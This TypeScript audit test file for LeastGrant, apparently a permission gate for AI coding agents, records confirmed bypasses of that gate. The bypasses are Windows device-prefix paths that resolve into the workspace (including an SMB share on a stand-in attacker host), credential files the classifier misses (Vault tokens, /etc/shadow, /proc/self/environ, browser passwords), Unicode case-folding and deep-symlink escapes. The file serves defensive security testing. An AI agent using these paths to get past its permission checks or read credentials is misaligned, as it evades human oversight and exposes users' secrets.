/**
 * Path / platform audit — confirmed containment-predicate failures.
 *
 * EVERY TEST IN THIS FILE IS EXPECTED TO FAIL against the current engine.
 * They are the specification for the fix, not a description of today's
 * behaviour. Each one was reproduced by running `decide()` with an envelope
 * saturated with human approvals for an ordinary in-project file operation —
 * the attacker's best case — and observing `allow`.
 *
 * Two root causes:
 *
 *  A. `canonicalizeUncached` (src/core/paths.ts) strips the Windows device and
 *     extended-length prefixes (`\\?\`, `\\.\`) with a case-sensitive regex that
 *     only understands a drive-letter or `UNC\` tail. Every other legal tail —
 *     `unc\` in any other case, `GLOBALROOT\Device\...`, `Volume{guid}\`,
 *     `PhysicalDrive0`, `pipe\` — survives the strip as a *relative* string and
 *     is then resolved against the agent's cwd, i.e. INTO the workspace. The
 *     original string still opens the real object when the agent executes it.
 *
 *  B. `classifySecretPath` (src/core/secrets.ts) is the only thing separating
 *     `<path:outside>` (tier 2, promotable at 11 approvals) from `<path:secret>`
 *     (ask floor). Because every file on the machine outside the project shares
 *     the single signature `Read(<path:outside>)`, any name the list misses is
 *     not "an unflagged read" — it is an auto-approved read of a credential.
 */

import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import * as os from 'node:os';
import * as fs from 'node:fs';
import * as path from 'node:path';
import type { Config, Request, Verdict } from '../src/core/types.js';
import { decide } from '../src/core/decide.js';
import { analyze } from '../src/core/classify.js';
import { newEnvelope, newSession, observe, DEFAULT_THRESHOLDS } from '../src/core/envelope.js';
import { DEFAULT_CONFIG } from '../src/store/index.js';
import { canonicalize, canonicalDir, isInside, CASE_INSENSITIVE } from '../src/core/paths.js';

const B = '\\';
const DAY = 86_400_000;
const WORKSPACE = path.join(os.tmpdir(), 'leastgrant-pathaudit-ws');
fs.mkdirSync(WORKSPACE, { recursive: true });

const config: Config = { ...DEFAULT_CONFIG, thresholds: { ...DEFAULT_THRESHOLDS }, rules: [] };

interface ToolCall {
  tool: string;
  input: Record<string, unknown>;
}

/** Saturate the envelope with human approvals for ordinary in-project work. */
function trainedOn(calls: ToolCall[], at = Date.now()) {
  const envelope = newEnvelope('project', WORKSPACE);
  for (let i = 0; i < 40; i++) {
    for (const c of calls) {
      const a = analyze(
        { agent: 't', tool: c.tool, input: c.input, cwd: WORKSPACE, sessionId: `s${i}`, at: at - (40 - i) * DAY },
        { roots: [WORKSPACE], secretPatterns: [] },
      );
      for (const action of a.actions) {
        observe(envelope, {
          signature: action.signature,
          capability: action.capability,
          blast: action.blast,
          evidence: 'confirmed',
          at: at - (40 - i) * DAY,
          sessionId: `s${i}`,
          display: action.display,
        });
      }
    }
  }
  return {
    roots: [WORKSPACE],
    secretPatterns: [] as string[],
    config,
    envelope,
    session: newSession('attack', at),
    stateDir: path.join(os.homedir(), '.leastgrant'),
    projectKey: WORKSPACE,
  };
}

function judge(tool: string, input: Record<string, unknown>, ctx: ReturnType<typeof trainedOn>): Verdict {
  const req: Request = { agent: 't', tool, input, cwd: WORKSPACE, sessionId: 'attack', at: Date.now() };
  ctx.session = newSession('attack', req.at);
  return decide(req, ctx);
}

/** Ordinary, heavily-approved in-project file work. */
const BASELINE: ToolCall[] = [
  { tool: 'Read', input: { file_path: path.join(WORKSPACE, 'src', 'b.ts') } },
  { tool: 'Write', input: { file_path: path.join(WORKSPACE, 'src', 'a.ts'), content: 'x' } },
  { tool: 'Edit', input: { file_path: path.join(WORKSPACE, 'src', 'c.ts') } },
  { tool: 'Glob', input: { path: path.join(WORKSPACE, 'src') } },
];

// ---------------------------------------------------------------------------
// A. Windows device / extended-length prefixes decay into cwd-relative paths
// ---------------------------------------------------------------------------

const win = process.platform === 'win32';

/**
 * Every one of these is a legal Win32 path form that opens a real object
 * OUTSIDE the workspace (verified on Windows 11 with fs.readFileSync), and
 * every one of them is canonicalized by LeastGrant into a path *inside* the
 * workspace.
 */
const ESCAPES: { name: string; p: string; what: string }[] = [
  {
    name: 'lowercase \\\\?\\unc\\ (regex only matches uppercase UNC)',
    p: B + B + '?' + B + 'unc' + B + 'attacker.example.com' + B + 'share' + B + 'loot.txt',
    what: 'an SMB share on an attacker-controlled host',
  },
  {
    name: 'mixed-case \\\\?\\Unc\\',
    p: B + B + '?' + B + 'Unc' + B + 'attacker.example.com' + B + 'share' + B + 'loot.txt',
    what: 'an SMB share on an attacker-controlled host',
  },
  {
    name: '\\\\.\\UNC\\ (device prefix has no UNC branch at all)',
    p: B + B + '.' + B + 'UNC' + B + 'attacker.example.com' + B + 'share' + B + 'loot.txt',
    what: 'an SMB share on an attacker-controlled host',
  },
  {
    name: '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeN\\',
    p: B + B + '?' + B + 'GLOBALROOT' + B + 'Device' + B + 'HarddiskVolume3' + B + 'Windows' + B + 'System32' + B + 'drivers' + B + 'etc' + B + 'hosts',
    what: 'any file on any volume, by device path',
  },
  {
    name: '\\\\.\\GLOBALROOT\\Device\\HarddiskVolumeN\\',
    p: B + B + '.' + B + 'GLOBALROOT' + B + 'Device' + B + 'HarddiskVolume3' + B + 'Users' + B + 'victim' + B + '.claude.json',
    what: 'any file on any volume, by device path',
  },
  {
    name: '\\\\?\\Volume{guid}\\',
    p: B + B + '?' + B + 'Volume{cccd65ec-eb01-4cc3-94b8-7cd513dc85c1}' + B + 'anything' + B + 'x.txt',
    what: 'any volume by GUID, including volumes with no drive letter',
  },
  {
    name: '\\\\.\\PhysicalDrive0',
    p: B + B + '.' + B + 'PhysicalDrive0',
    what: 'the raw disk device',
  },
];

describe('audit-paths: Windows device prefixes must not resolve into the workspace', { skip: !win }, () => {
  for (const e of ESCAPES) {
    // EXPECTED TO FAIL: canonicalize() currently returns a path under cwd.
    test(`canonicalize keeps ${e.name} outside the workspace`, () => {
      const abs = canonicalize(e.p, WORKSPACE).abs;
      assert.equal(
        isInside(abs, canonicalDir(WORKSPACE)),
        false,
        `${e.p} names ${e.what}, but canonicalized to ${abs}, which reads as inside the project`,
      );
    });
  }

  const ctx = trainedOn(BASELINE);

  // `\\?\Volume{guid}\` is deliberately excluded from the decide() matrix
  // below: its braces make looksLikePath() reject it, so normalizeArg templates
  // it as `<text>` and it lands on an untrained signature. The *capability* is
  // still wrong (fs.write.workspace for a path on another volume) — see the
  // canonicalize-level case above, which does fail.
  for (const e of ESCAPES.filter((x) => !x.p.includes('{'))) {
    for (const [tool, key] of [
      ['Read', 'file_path'],
      ['Write', 'file_path'],
      ['Edit', 'file_path'],
      ['Glob', 'path'],
    ] as const) {
      // EXPECTED TO FAIL: verdict is `allow`.
      test(`${tool} via ${e.name} is not auto-approved`, () => {
        const v = judge(tool, { [key]: e.p, content: 'x' }, ctx);
        assert.notEqual(
          v.decision,
          'allow',
          `${tool} ${e.p} reaches ${e.what}; got allow (${v.action.capability} / ${v.action.signature})`,
        );
      });
    }
  }

  // The general invariant the fix should establish, stated without reference to
  // any particular tail: after stripping a `\\?\` or `\\.\` prefix the result
  // must never be a relative path.
  // EXPECTED TO FAIL.
  test('no \\\\?\\ or \\\\.\\ path ever canonicalizes under the cwd', () => {
    const tails = ['unc' + B + 's' + B + 'h' + B + 'f', 'GLOBALROOT' + B + 'Device' + B + 'HarddiskVolume1' + B + 'x',
      'Volume{00000000-0000-0000-0000-000000000000}' + B + 'x', 'pipe' + B + 'x', 'PhysicalDrive0', 'BootPartition' + B + 'x'];
    const bad: string[] = [];
    for (const pre of [B + B + '?' + B, B + B + '.' + B]) {
      for (const t of tails) {
        const abs = canonicalize(pre + t, WORKSPACE).abs;
        if (isInside(abs, canonicalDir(WORKSPACE))) bad.push(`${pre + t} -> ${abs}`);
      }
    }
    assert.deepEqual(bad, [], 'these device paths were resolved into the workspace');
  });
});

// ---------------------------------------------------------------------------
// B. classifySecretPath misses, and a miss is an auto-approved credential read
// ---------------------------------------------------------------------------

const HOME = os.homedir();

const MISSED_CREDENTIALS: { name: string; p: string; posixOnly?: boolean }[] = [
  { name: '~/.vault-token (HashiCorp Vault token)', p: path.join(HOME, '.vault-token') },
  { name: '~/.claude.json (agent config: MCP server env, account + prompt history)', p: path.join(HOME, '.claude.json') },
  { name: '~/.m2/settings.xml (Maven repository passwords)', p: path.join(HOME, '.m2', 'settings.xml') },
  { name: '~/.gradle/gradle.properties (signing and publish credentials)', p: path.join(HOME, '.gradle', 'gradle.properties') },
  { name: '~/.mozilla/firefox/p.default/logins.json (saved browser passwords)', p: path.join(HOME, '.mozilla', 'firefox', 'p.default', 'logins.json') },
  { name: '~/.local/share/keyrings/login.keyring (GNOME keyring)', p: path.join(HOME, '.local', 'share', 'keyrings', 'login.keyring') },
  { name: '~/.config/op/config (1Password CLI)', p: path.join(HOME, '.config', 'op', 'config') },
  { name: '~/.ansible/vault_pass', p: path.join(HOME, '.ansible', 'vault_pass') },
  { name: 'global npmrc with no leading dot', p: path.join(HOME, 'AppData', 'Roaming', 'npm', 'etc', 'npmrc') },
  { name: '/proc/self/environ (the agent process env, i.e. its own API keys)', p: '/proc/self/environ', posixOnly: true },
  { name: '/etc/shadow', p: '/etc/shadow', posixOnly: true },
];

describe('audit-paths: a missed credential name becomes an auto-approved read', () => {
  // Trained on nothing more exotic than reading one ordinary file outside the
  // project — a sibling repo, a note in $HOME. That is the whole cost of the
  // attack, because every outside read shares one signature.
  const ctx = trainedOn([{ tool: 'Read', input: { file_path: path.join(HOME, 'notes.md') } }]);

  for (const c of MISSED_CREDENTIALS) {
    // EXPECTED TO FAIL: verdict is `allow` with signature Read(<path:outside>).
    test(`Read ${c.name} is not auto-approved`, { skip: c.posixOnly && win }, () => {
      const v = judge('Read', { file_path: c.p }, ctx);
      assert.notEqual(
        v.decision,
        'allow',
        `reading ${c.p} was auto-approved as ${v.action.signature}; ` +
          'classifySecretPath does not recognise it, and fs.read.outside is tier 2 (promotable)',
      );
    });
  }

  // The structural point: the whole machine is one signature. Even if every
  // name above is added to the list, the next one that is missed is again a
  // silent credential read. Reading outside the project should not collapse to
  // a single learnable identity.
  test('outside reads of unrelated files do not share one learnable signature', () => {
    const a = analyze({ agent: 't', tool: 'Read', input: { file_path: path.join(HOME, 'notes.md') }, cwd: WORKSPACE, sessionId: 's', at: Date.now() }, { roots: [WORKSPACE], secretPatterns: [] });
    const b = analyze({ agent: 't', tool: 'Read', input: { file_path: path.join(HOME, '.vault-token') }, cwd: WORKSPACE, sessionId: 's', at: Date.now() }, { roots: [WORKSPACE], secretPatterns: [] });
    assert.notEqual(
      a.actions[0]!.signature,
      b.actions[0]!.signature,
      'every file on the machine outside the project shares the signature Read(<path:outside>)',
    );
  });
});

// ---------------------------------------------------------------------------
// C. isInside case-folds with JS toLowerCase, which is not the NTFS table
// ---------------------------------------------------------------------------

describe('audit-paths: case folding must match the filesystem', { skip: !CASE_INSENSITIVE }, () => {
  // U+212A KELVIN SIGN lowercases to ASCII 'k' in JS but is a distinct
  // character to NTFS: `<root-with-a-k>` and the Kelvin variant are two
  // different directories, and the second is not inside the first.
  // Verified on NTFS: both directories can exist simultaneously.
  // EXPECTED TO FAIL.
  test('U+212A does not fold into ASCII k for containment', () => {
    const root = 'C:' + B + 'dev' + B + 'kit';
    const KELVIN = 'K'; // KELVIN SIGN: JS lowercases it to ASCII 'k'; NTFS does not
    const other = 'C:' + B + 'dev' + B + KELVIN + 'it' + B + 'stolen.txt';
    assert.equal(isInside(other, root), false, `${other} is a different directory from ${root} on NTFS`);
  });
});

// ---------------------------------------------------------------------------
// D. realpathBestEffort gives up after 64 levels and returns the literal path
// ---------------------------------------------------------------------------

describe('audit-paths: an unresolvable path is not assumed to be contained', () => {
  // canonicalize() reports `realpathed: false` when it could not resolve the
  // path, and nothing in the engine ever reads that flag. Past the 64-step
  // limit in realpathBestEffort a path that goes through a symlink pointing
  // out of the workspace comes back as the literal string, which reads as
  // inside.
  // EXPECTED TO FAIL.
  test('deep path through an escaping symlink is not reported as inside', (t) => {
    // Use the *canonical* workspace root: on Windows os.tmpdir() comes back in
    // 8.3 form, and comparing an 8.3 fallback against a long-form root hides
    // the bug behind an unrelated mismatch.
    const ws = canonicalDir(WORKSPACE);
    const target = path.join(os.tmpdir(), 'leastgrant-pathaudit-target');
    fs.mkdirSync(target, { recursive: true });
    fs.mkdirSync(ws, { recursive: true });
    const link = path.join(ws, 'escape');
    try {
      fs.rmSync(link, { recursive: true, force: true });
      fs.symlinkSync(target, link, 'junction');
    } catch {
      t.skip('cannot create a symlink/junction in this environment');
      return;
    }
    let deep = link;
    for (let i = 0; i < 70; i++) deep = path.join(deep, 'a');
    const c = canonicalize(deep, ws);
    assert.equal(
      isInside(c.abs, ws),
      false,
      `gave up resolving and returned the literal path ${c.abs}, which reads as inside`,
    );
  });
});
